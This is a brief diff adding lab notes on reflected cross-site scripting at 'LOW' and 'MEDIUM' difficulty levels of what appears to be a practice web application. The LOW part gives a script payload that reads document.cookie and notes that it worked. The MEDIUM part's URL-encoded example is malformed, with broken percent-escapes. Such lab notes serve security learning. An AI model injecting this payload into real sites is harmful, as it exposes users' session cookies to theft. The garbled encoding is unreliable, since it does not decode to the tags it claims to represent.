@@ -1,0 +1,13 @@
+*******
+* LOW *
+*******
+<body><h1>You are</h1><h2>hacked</h2><script>alert(document.cookie)</script></body>
+  result:HTML is added to the page and document cookie is shown in the alert
+
+**********
+* MEDIUM *
+**********
+URL encode the HTML Tags
+%3Ch1%E0Atesting%3C2Fh1%3E%0A
+
+
